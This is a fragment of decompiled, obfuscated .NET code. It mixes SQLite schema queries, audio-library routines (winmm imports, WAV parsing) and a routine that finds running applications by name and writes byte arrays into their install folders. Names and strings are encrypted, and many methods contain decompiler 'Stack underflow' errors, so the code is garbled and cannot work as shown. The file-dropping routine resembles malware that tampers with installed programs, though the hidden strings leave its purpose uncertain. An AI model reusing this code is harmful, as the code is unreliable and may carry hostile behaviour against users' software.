			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362386), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362361), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362308), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362799), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362814), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362765), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362780), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362723), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362738), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362717), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107362704), _0091._0080_0004(typeof(int).TypeHandle));
			if (global::_001C._0096_0003(_0003))
			{
				_0003 = _0080._0014._0001(107401775);
			}
			string text = ((_009D_0003._009D_0007(_0003, _0080._0014._0001(107401766), StringComparison.OrdinalIgnoreCase) == 0) ? _0080._0014._0001(107362630) : _0080._0014._0001(107362683));
			global::_0008._007E_0011_0002(dataTable);
			global::_0010._001C obj = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107362605), new object[2] { _0003, text }), _0002);
			try
			{
				_0014 obj2 = _0018._0001(obj);
				try
				{
					while (global::_001B._007E_008F_0003(obj2))
					{
						bool flag = false;
						list.Clear();
						if (!global::_001C._0096_0003(_0004) && _009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj2, 2), _0004, StringComparison.OrdinalIgnoreCase) != 0)
						{
							continue;
						}
						try
						{
							global::_0010._001C obj3 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107362024), new object[2]
							{
								_0003,
								_009E_0003._007E_0001_0008(obj2, 2)
							}), _0002);
							try
							{
								_0014 obj4 = _0018._0001(obj3);
								try
								{
									while (global::_001B._007E_008F_0003(obj4))
									{
										if (_0004_0005._007E_008D_000E(obj4, 5) == 1)
										{
											list.Add(new KeyValuePair<int, string>(_0004_0005._007E_008D_000E(obj4, 0), _009E_0003._007E_0001_0008(obj4, 1)));
											if (_009D_0003._009D_0007(_009E_0003._007E_0001_0008(obj4, 2), _0080._0014._0001(107362015), StringComparison.OrdinalIgnoreCase) == 0)
											{
												flag = true;
											}
										}
									}
								}
								finally
								{
									if (obj4 != null)
									{
										global::_0008._007E_0098(obj4);
									}
								}
							}
							finally
							{
								if (obj3 != null)
								{
									global::_0008._007E_0098(obj3);
								}
							}
						}
						catch (SQLiteException)
						{
						}
						if (list.Count == 1 && flag)
						{
							DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362379), _0003);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362361), _0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107362002), new object[2]
							{
								_009E_0003._007E_0001_0008(obj2, 2),
								text
							}));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362308), _0003);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362814), _009E_0003._007E_0001_0008(obj2, 2));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362765), list[0].Value);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362723), _0006_0004._007E_0010_0008(dataRow, _0080._0014._0001(107362361)));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362780), 0);
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362738), _0080._0014._0001(107361953));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362717), _0080._0014._0001(107361976));
							_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362704), 2);
							if (global::_001C._0096_0003(_0005) || _009D_0003._009D_0007(_0005, (string)_0006_0004._007E_0010_0008(dataRow, _0080._0014._0001(107362723)), StringComparison.OrdinalIgnoreCase) == 0)
							{
								_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
							}
						}
						global::_0010._001C obj5 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107361971), new object[3]
						{
							_0003,
							global::_0003._007E_0080(_009E_0003._007E_0001_0008(obj2, 2), _0080._0014._0001(107361834), _0080._0014._0001(107361829)),
							text
						}), _0002);
						try
						{
							_0014 obj6 = _0018._0001(obj5);
							try
							{
								while (global::_001B._007E_008F_0003(obj6))
								{
									int num = 0;
									if (!global::_001C._0096_0003(_0005) && _009D_0003._009D_0007(_0005, _009E_0003._007E_0001_0008(obj6, 1), StringComparison.OrdinalIgnoreCase) != 0)
									{
										continue;
									}
									try
									{
										global::_0010._001C obj7 = new global::_0010._001C(_0018._0001((IFormatProvider)_008F_0003._008B_0007(), _0080._0014._0001(107361824), new object[2]
										{
											_0003,
											_009E_0003._007E_0001_0008(obj6, 1)
										}), _0002);
										try
										{
											_0014 obj8 = _0018._0001(obj7);
											try
											{
												while (global::_001B._007E_008F_0003(obj8))
												{
													string text2 = (_0008_0005._007E_0091_000E(obj8, 2) ? null : _009E_0003._007E_0001_0008(obj8, 2));
													DataRow dataRow = _0005_0005._007E_008E_000E(dataTable);
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362379), _0003);
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362361), _009E_0003._007E_0001_0008(obj6, 1));
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362308), _0003);
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362814), _009E_0003._007E_0001_0008(obj6, 2));
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362765), text2);
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362723), _009E_0003._007E_0001_0008(obj6, 1));
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362780), num);
													string text3 = null;
													int num2 = 0;
													int num3 = 0;
													if (text2 != null)
													{
														_0002._0001._0001(_0003, _009E_0003._007E_0001_0008(obj6, 1), text2, ref num2, ref num3, ref text3);
													}
													if (!global::_001C._0096_0003(text3))
													{
														_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362738), text3);
													}
													dataRow[_0080._0014._0001(107362717)] = ((num2 == 0) ? _0080._0014._0001(107361976) : _0080._0014._0001(107361815));
													_0083_0004._007E_0093_0008(dataRow, _0080._0014._0001(107362704), num3);
													num++;
													if (P_4 == null || _009D_0003._009D_0007(P_4, text2, StringComparison.OrdinalIgnoreCase) == 0)
													{
														_0007_0005._007E_0090_000E(_0006_0005._007E_008F_000E(dataTable), dataRow);
													}
												}
											}
											finally
											{
												if (obj8 != null)
												{
													global::_0008._007E_0098(obj8);
												}
											}
										}
										finally
										{
											if (obj7 != null)
											{
												global::_0008._007E_0098(obj7);
											}
										}
									}
									catch (SQLiteException)
									{
									}
								}
							}
							finally
							{
								if (obj6 != null)
								{
									global::_0008._007E_0098(obj6);
								}
							}
						}
						finally
						{
							if (obj5 != null)
							{
								global::_0008._007E_0098(obj5);
							}
						}
					}
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
			global::_0008._007E_0012_0002(dataTable);
			global::_0008._007E_0013_0002(dataTable);
			return dataTable;
		}

		static void _0001(global::_0004._0001 _0002, string _0003, string P_2)
		{
			//IL_05ca: Incompatible stack heights: 0 vs 1
			//IL_05d4: Incompatible stack heights: 0 vs 1
			try
			{
				_0018._0001(((global::_0004._0001)/*Error near IL_000c: Stack underflow*/)._0001);
				byte[] array = (byte[])/*Error near IL_05da: Stack underflow*/;
				switch (_0018._0001(_0003))
				{
				case 194956622u:
					if (_0010_0003._008B_0006(_0003, _0080._0014._0001(107362286)))
					{
						Process[] array4 = _000E_0005._0094_000E(global::_0015._0001._0016);
						if (array4.Length != 0)
						{
							_0018._0001(_0002, global::_001A._007E_000E_0003(array4[0]));
						}
						string text2 = global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0016, global::_0002._007E_0006(_0080._0014._0001(107362089)));
						if (!global::_001C._0095_0003(_0018._0001()))
						{
							global::_001D._0098_0003(_0018._0001());
						}
						_000F_0005._0095_000E(text2, array);
						_0018._0001(_0002);
					}
					break;
				case 671669610u:
					if (_0010_0003._008B_0006(_0003, _0080._0014._0001(107362297)) && array != null)
					{
						_000F_0005._0095_000E(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._001C), array);
					}
					break;
				case 2912791961u:
					if (_0010_0003._008B_0006(_0003, _0080._0014._0001(107362240)) && array != null)
					{
						if (!global::_001C._0095_0003(_0018._0001()))
						{
							global::_001D._0098_0003(_0018._0001());
						}
						string text = global::_000F._008B_0002(_0018._0001(), global::_0002._007E_0006(_0080._0014._0001(107362080)));
						if (!global::_001C._0095_0003(text))
						{
							global::_001D._0098_0003(text);
						}
						_000F_0005._0095_000E(global::_0011._008E_0002(text, global::_0015._0001._0006, _0080._0014._0001(107362089)), array);
						_0018._0001(_0002, global::_0011._008E_0002(text, global::_0015._0001._0006, global::_0002._007E_0006(_0080._0014._0001(107362089))));
						global::_0007._0096(10);
						_0002._0001._0001(_0002._0001._0001);
					}
					break;
				case 2404742552u:
					if (_0010_0003._008B_0006(_0003, _0080._0014._0001(107362219)) && array != null)
					{
						if (!global::_001C._0095_0003(_0018._0001()))
						{
							global::_001D._0098_0003(_0018._0001());
						}
						Process[] array3 = _000E_0005._0094_000E(global::_0015._0001._0005);
						if (array3.Length != 0)
						{
							_0018._0001(_0002, global::_001A._007E_000E_0003(array3[0]));
						}
						global::_0007._0096(10);
						_000F_0005._0095_000E(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0005, _0080._0014._0001(107362089)), array);
					}
					break;
				case 971238451u:
					if (!_0010_0003._008B_0006(_0003, _0080._0014._0001(107362230)))
					{
						break;
					}
					goto IL_0441;
				case 3366806400u:
					if (!_0010_0003._008B_0006(_0003, _0080._0014._0001(107362177)))
					{
						break;
					}
					goto IL_0441;
				case 1654695744u:
					if (_0010_0003._008B_0006(_0003, _0080._0014._0001(107362156)))
					{
						if (!global::_001C._0095_0003(_0018._0001()))
						{
							global::_001D._0098_0003(_0018._0001());
						}
						if (array != null)
						{
							_000F_0005._0095_000E(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0003, global::_000E._008A_0002(_0080._0014._0001(107362099), new char[1] { '!' })[0]), array);
						}
					}
					break;
				case 3540061156u:
					if (_0010_0003._008B_0006(_0003, _0080._0014._0001(107362167)) && array != null)
					{
						_000F_0005._0095_000E(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._0004), array);
					}
					break;
				case 2744991453u:
					{
						if (_0010_0003._008B_0006(_0003, _0080._0014._0001(107362114)) && array != null)
						{
							_000F_0005._0095_000E(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._001D), array);
						}
						break;
					}
					IL_0441:
					if (!global::_001C._0095_0003(_0018._0001()))
					{
						global::_001D._0098_0003(_0018._0001());
					}
					if (array != null)
					{
						Process[] array2 = _000E_0005._0094_000E(global::_0015._0001._001A);
						if (array2.Length != 0)
						{
							_0018._0001(_0002, global::_001A._007E_000E_0003(array2[0]));
						}
						global::_0007._0096(10);
						_000F_0005._0095_000E(global::_0011._008E_0002(_0018._0001(), global::_0015._0001._001A, global::_0002._007E_0006(_0080._0014._0001(107362089))), array);
					}
					break;
				}
			}
			catch
			{
			}
		}

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetLineControls")]
		static extern MmResult _0001(IntPtr _0002, ref global::_0015._0003._0003 _0003, _001D._0001 _0004);

		static void _0001(int _0002, string _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			_ = (object)(int)/*Error near IL_0007: Stack underflow*/;
			_0018._0001((object)/*Error near IL_0017: Stack underflow*/, (string)/*Error near IL_0017: Stack underflow*/);
		}

		static void _0001(int _0002, int _0003, float[] _0004, global::_000F._0006 P_3)
		{
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Expected F4, but got Unknown
			//IL_0095: Incompatible stack heights: 0 vs 2
			//IL_009b: Incompatible stack heights: 0 vs 2
			int num = 0;
			while (num < _0003)
			{
				_ = 1f;
				_ = (float)((global::_000F._0006)/*Error near IL_001a: Stack underflow*/)._0001;
				int num2 = ((global::_000F._0006)/*Error near IL_0025: Stack underflow*/)._0002;
				_003F val = /*Error near IL_0027: Stack underflow*// (float)num2;
				float num3 = /*Error near IL_0028: Stack underflow*/- val;
				for (int i = 0; i < P_3._0001.WaveFormat._0001; i++)
				{
					_0004[_0002 + num++] *= num3;
				}
				P_3._0001++;
				if (P_3._0001 > P_3._0002)
				{
					P_3._0001 = global::_000F._0006._0001._0001;
					_0018._0001(num + _0002, _0004, _0003 - num);
					break;
				}
			}
		}

		unsafe static void _0001(IntPtr _0002, IntPtr[] _0003, int _0004, int _0005)
		{
			//IL_0079: Incompatible stack heights: 0 vs 2
			//IL_0083: Incompatible stack heights: 0 vs 1
			_ = _0010_0005._0096_000E;
			/*Error near IL_0083: Stack underflow*/((IntPtr)/*Error near IL_0083: Stack underflow*/);
			short* ptr = (short*)/*Error near IL_0089: Stack underflow*/;
			short*[] array = new short*[_0004];
			for (int i = 0; i < _0004; i++)
			{
				array[i] = (short*)_0010_0005._0096_000E(_0003[i]);
				array[i]++;
			}
			for (int j = 0; j < _0005; j++)
			{
				for (int k = 0; k < _0004; k++)
				{
					short* intPtr = array[k];
					short* num = ptr;
					ptr = num + 1;
					*intPtr = *num;
					array[k] += 2;
				}
			}
		}

		static void _0001(global::_0017._0080 _0002)
		{
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107362078);
			string text = (string)/*Error near IL_0054: Stack underflow*/;
			_0080._0014._0001(107361493);
			string text2 = (string)/*Error near IL_0012: Stack underflow*/;
			global::_0010._001C obj = _0018._0001(_0002);
			_0082_0003._007E_0011_0007(obj, text);
			global::_001A._007E_001A_0003(obj);
			_0082_0003._007E_0011_0007(obj, text2);
			global::_001A._007E_001A_0003(obj);
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutGetErrorText")]
		static extern MmResult _0001(IntPtr _0002, string _0003, int _0004);

		static void _0001(Stream _0002, _001C._0004 _0003)
		{
			//IL_0061: Incompatible stack heights: 0 vs 1
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006b: Incompatible stack heights: 0 vs 1
			new global::_0005._0010((Stream)/*Error near IL_0068: Stack underflow*/);
			_001A._0005 obj2 = new _001A._0005(_0086_0086: ((_001C._0004)/*Error near IL_000b: Stack underflow*/).WaveFormat, _0087_0086: (Stream)/*Error near IL_0010: Stack underflow*/);
			try
			{
				byte[] array = new byte[_0003.WaveFormat._0002 * 4];
				while (true)
				{
					int num = _0003.Read(array, 0, array.Length);
					if (num == 0)
					{
						break;
					}
					_0083._007E_0008_0004(obj2, array, 0, num);
				}
				global::_0008._007E_0001_0002(_0002);
			}
			finally
			{
				if (obj2 != null)
				{
					global::_0008._007E_0098(obj2);
				}
			}
		}

		unsafe static MmResult _0001(out IntPtr _0002, global::_0005._0005 _0003, int _0004, global::_000E._000E _0005, global::_0017._0008._0003 P_4)
		{
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			_ = ((global::_000E._000E)/*Error near IL_0055: Stack underflow*/).Strategy;
			if ((int)/*Error near IL_0006: Stack underflow*/ == 0)
			{
				return _0018._0001(_0003: _0099._008E_0004(_0004), _0004: _0003, _0005: P_4, _0006: IntPtr.Zero, _0002: out *(IntPtr*)/*Error near IL_0025: Stack underflow*/, _0007: global::_0017._0008._0001._0002);
			}
			return _0018._0001(out _0002, _0099._008E_0004(_0004), _0003, _0005.Handle, IntPtr.Zero, global::_0017._0008._0001._0004);
		}

		static global::_0017._0017 _0001(int _0002, int _0003, int _0004)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			_0018._0001((int)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
			return new global::_0017._0017(144 + _0003 - 1, _0004, _0002);
		}

		static void _0001(_001E._0004 _0002, _001A._0001 _0003, int _0004, global::_000E._0003[] P_3)
		{
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 2
			//IL_0025: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			int num;
			int num2 = ((global::_0013._0005)/*Error near IL_0018: Stack underflow*/)._0001((_001A._0001)/*Error near IL_0018: Stack underflow*/, (int)/*Error near IL_0018: Stack underflow*/, P_3, out num);
			/*Error near IL_001d: Stack underflow*/(num2);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_extended_errcode")]
		static extern _0080._0017 _0001(IntPtr _0002);

		static void _0001(global::_0003._0011 _0002, _001B._0014 P_1)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			new _001B._0015((global::_0003._0011)/*Error near IL_0032: Stack underflow*/);
			((_001B._0014)/*Error near IL_000b: Stack underflow*/)._0001 = (_001B._0015)/*Error near IL_000b: Stack underflow*/;
			global::_0007._0097(P_1._0001._0001(P_1._0001));
		}

		static void _0001(Exception _0002, global::_000E._0008 P_1)
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			new global::_000E._0008._0012();
			global::_000E._0008._0012 CS_0024_003C_003E8__locals0;
			if (2u != 0)
			{
				CS_0024_003C_003E8__locals0 = (global::_000E._0008._0012)/*Error near IL_006f: Stack underflow*/;
			}
			((global::_000E._0008._0012)/*Error near IL_000e: Stack underflow*/)._0001 = P_1;
			CS_0024_003C_003E8__locals0._0001 = _0002;
			CS_0024_003C_003E8__locals0._0001 = P_1._0001;
			if (CS_0024_003C_003E8__locals0._0001 == null)
			{
				return;
			}
			if (P_1._0001 == null)
			{
				CS_0024_003C_003E8__locals0._0001(P_1, new global::_0003._0003(CS_0024_003C_003E8__locals0._0001));
				return;
			}
			_0011_0005._007E_0097_000E(P_1._0001, delegate
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((global::_000E._0008._0012)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((global::_000E._0008._0012)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((global::_000E._0008._0012)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}, null);
		}

		static Guid _0001(MediaType _0002, Guid P_1)
		{
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 2
			_ = ((MediaType)/*Error near IL_0007: Stack underflow*/)._0001;
			((_0019._0012)/*Error near IL_001a: Stack underflow*/)._0001((Guid)/*Error near IL_001a: Stack underflow*/, out Guid result);
			return result;
		}

		static void _0001(int _0002, global::_0006._0006 P_1)
		{
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected I8, but got Unknown
			//IL_0060: Incompatible stack heights: 0 vs 2
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006a: Incompatible stack heights: 0 vs 1
			_ = global::_0012._007E_0091_0002;
			/*Error near IL_0067: Stack underflow*/((object)/*Error near IL_0067: Stack underflow*/);
			int num = ((global::_0006._0006)/*Error near IL_0010: Stack underflow*/).WaveFormat._0002;
			long num2 = /*Error near IL_0019: Stack underflow*/+ num * _0002;
			if (num2 > global::_0012._007E_0090_0002(P_1))
			{
				_007F_0002._007E_0083_0005(P_1, global::_0012._007E_0090_0002(P_1));
			}
			else if (num2 < 0)
			{
				_007F_0002._007E_0083_0005(P_1, 0L);
			}
			else
			{
				_007F_0002._007E_0083_0005(P_1, num2);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static byte[] _0001(string _0002)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected I4, but got Unknown
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 3
			//IL_004e: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			_ = _008A_0004._007E_009F_0008;
			_ = global::_0001._001A._0001;
			/*Error near IL_004e: Stack underflow*/((object)/*Error near IL_004e: Stack underflow*/, (string)/*Error near IL_004e: Stack underflow*/);
			int num = /*Error near IL_0016: Stack underflow*/+ 1;
			byte[] array = new byte[num];
			num = _0012_0005._007E_0098_000E(global::_0001._001A._0001, _0002, 0, global::_001A._007E_0016_0003(_0002), array, 0);
			array[num] = 0;
			return array;
		}

		static void _0001(global::_0010._0002 _0002, double _0003, bool P_2)
		{
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			_ = ((global::_0010._0002)/*Error near IL_0007: Stack underflow*/)._0003;
			if (/*Error near IL_000b: Stack underflow*/ != /*Error near IL_000b: Stack underflow*/)
			{
				((global::_0010._0002)/*Error near IL_0013: Stack underflow*/)._0003 = _0003;
				if (P_2 && _0002._0001 != null)
				{
					_0015_0002._007E_0017_0005(_0002._0001, _0002, EventArgs.Empty);
				}
				global::_0008._009D(_0002);
			}
		}

		static void _0001(global::_0006._0017 _0002, Hashtable P_1)
		{
			//IL_00a5: Incompatible stack heights: 0 vs 3
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b9: Incompatible stack heights: 0 vs 1
			_ = _0014_0005._007E_009A_000E;
			_ = _0013_0005._0099_000E;
			/*Error near IL_00af: Stack underflow*/((object)/*Error near IL_00af: Stack underflow*/, true);
			/*Error near IL_00b9: Stack underflow*/((object)/*Error near IL_00b9: Stack underflow*/);
			IEnumerator enumerator = (IEnumerator)/*Error near IL_001b: Stack underflow*/;
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					PropertyDescriptor propertyDescriptor = (PropertyDescriptor)_0083_0003._007E_001D_0007(enumerator);
					if (_0010_0003._008C_0006(global::_0002._007E_0017(propertyDescriptor), _0080._0014._0001(107361400)) && !_0087_0004._007E_0099_0008(P_1, global::_0002._007E_0018(propertyDescriptor)))
					{
						_001F_0003._007E_0002_0007(P_1, global::_0002._007E_0018(propertyDescriptor), propertyDescriptor);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					global::_0008._007E_0098(disposable);
				}
			}
		}

		static _001F._0005 _0001(int _0002)
		{
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 1
			_001F._0005 result = default(_001F._0005);
			_ = _0098._0089_0004;
			object obj = (_001F._0005)/*Error near IL_0014: Stack underflow*/;
			/*Error near IL_0044: Stack underflow*/(obj);
			int num = (int)/*Error near IL_0047: Stack underflow*/;
			_0018._0001(_0018._0001(_0099._008E_0004(_0002), out result, num), _0080._0014._0001(107361375));
			return result;
		}

		static void _0001(global::_0008._0001 P_0)
		{
			//IL_0113: Incompatible stack heights: 0 vs 3
			//IL_011d: Incompatible stack heights: 0 vs 3
			//IL_0127: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_001C._0097_0003;
				_ = global::_0011._008E_0002;
				_0018._0001();
				_ = global::_0015._0001._0003;
				_ = global::_0002._007E_0006;
				_0080._0014._0001(107362089);
				/*Error near IL_0127: Stack underflow*/((object)/*Error near IL_0127: Stack underflow*/);
				string text = /*Error near IL_002f: Stack underflow*/((string)/*Error near IL_002f: Stack underflow*/, (string)/*Error near IL_002f: Stack underflow*/, (string)/*Error near IL_002f: Stack underflow*/);
				if (!/*Error near IL_0034: Stack underflow*/(text))
				{
					return;
				}
				_0018._0001(P_0._0001, global::_0011._008E_0002(_0018._0001(), global::_0015._0001._0003, global::_0002._007E_0006(_0080._0014._0001(107362089))));
				int num = 0;
				while (true)
				{
					if (num >= 10)
					{
						return;
					}
					global::_0007._0096(10);
					if (global::_001C._0097_0003(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._0003)))
					{
						break;
					}
					num++;
				}
				_0018._0001(P_0, _0015_0005._009D_000E(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._0003)), global::_000E._008A_0002(_0080._0014._0001(107361318), new char[1] { '|' })[0], false);
			}
			catch
			{
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "waveOutPause")]
		static extern MmResult _0001(IntPtr _0002);

		static double _0001(double _0002)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Incompatible stack heights: 0 vs 2
			//IL_001c: Expected F8, but got Unknown
			//IL_001c: Incompatible stack heights: 0 vs 1
			_ = global::_0015._009E_0002;
			_003F val = /*Error near IL_0011: Stack underflow*/* 0.11512925464970228;
			/*Error near IL_001c: Stack underflow*/((double)val);
			return (double)/*Error near IL_0014: Stack underflow*/;
		}

		static void _0001(global::_0001._007F P_0)
		{
			//IL_0025: Incompatible stack heights: 0 vs 2
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((global::_0001._007F)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002c: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				new InvalidOperationException();
				throw /*Error near IL_0018: Stack underflow*/;
			}
			_0018._0001(P_0._0001);
		}

		unsafe static void _0001(ref global::_0005._0005 _0002, out long _0003, [Out] Stream _0004, out int _0005, List<global::_0005._0006._0001> _0006)
		{
			//IL_027f: Incompatible stack heights: 0 vs 1
			//IL_0285: Incompatible stack heights: 0 vs 1
			//IL_028b: Incompatible stack heights: 0 vs 1
			*(long*)(nint)/*Error near IL_0008: Stack underflow*/ = -1L;
			*(@null*)(nint)/*Error near IL_000f: Stack underflow*/ = null;
			BinaryReader binaryReader = new BinaryReader((Stream)/*Error near IL_0019: Stack underflow*/);
			if (_0018._0001(binaryReader) != _0080._0014._0001(107389153))
			{
				throw new FormatException(_0080._0014._0001(107361309));
			}
			_0018._0001(binaryReader.ReadBytes(4));
			string text = _0018._0001(binaryReader);
			if (text != _0080._0014._0001(107361740) && text != _0080._0014._0001(107389176))
			{
				throw new FormatException(_0080._0014._0001(107361731));
			}
			_0005 = 0;
			while (binaryReader.BaseStream.Position < binaryReader.BaseStream.Length)
			{
				global::_0005._0006._0001 item = _0018._0001(binaryReader);
				if (item._0001 == _0080._0014._0001(107361678) || binaryReader.BaseStream.Position + item._0001 > binaryReader.BaseStream.Length)
				{
					break;
				}
				if (item._0001 == _0080._0014._0001(107361669))
				{
					short num = _0018._0001(binaryReader.ReadBytes(2));
					_0018._0001(binaryReader.ReadBytes(4));
					short num2 = _0018._0001(binaryReader.ReadBytes(2));
					double num3 = _0018._0001(binaryReader.ReadBytes(10));
					_0002 = new global::_0005._0005((int)num3, num2, num);
					if (item._0001 > 18 && text == _0080._0014._0001(107361740))
					{
						if (new string(binaryReader.ReadChars(4)).ToLower() != _0080._0014._0001(107361692))
						{
							throw new FormatException(_0080._0014._0001(107361683));
						}
						binaryReader.ReadBytes((int)(item._0001 - 22));
					}
					else
					{
						binaryReader.ReadBytes((int)(item._0001 - 18));
					}
				}
